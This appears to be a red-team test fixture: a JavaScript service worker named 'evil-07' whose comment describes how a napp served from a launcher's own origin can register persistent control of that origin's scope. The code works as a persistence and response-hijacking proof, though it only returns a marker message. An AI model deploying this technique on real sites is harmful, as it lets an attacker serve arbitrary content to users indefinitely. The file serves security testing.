// evil-07's shipped service worker — a REAL, persistent one. When a launcher
// serves napp bytes from its own origin (the at-launcher mistake) and does
// not stub registration, the napp registers this at the launcher origin and
// owns its scope forever: it survives launcher reloads, napp uninstall, and
// serves attacker bytes for everything under its scope. Red-team proof only:
// it serves a loud, unmistakable marker response.
self.addEventListener('install', () => self.skipWaiting())
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()))
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url)
  if (url.origin !== self.location.origin) return
  if (url.pathname.startsWith('/napps/evil-07-persistence/')) {
    event.respondWith(new Response(
      'served by the EVIL-07 service worker — persistent control of this scope (evil-napps red team proof, unregister me)',
      { headers: { 'Content-Type': 'text/plain' } }
    ))
  }
})
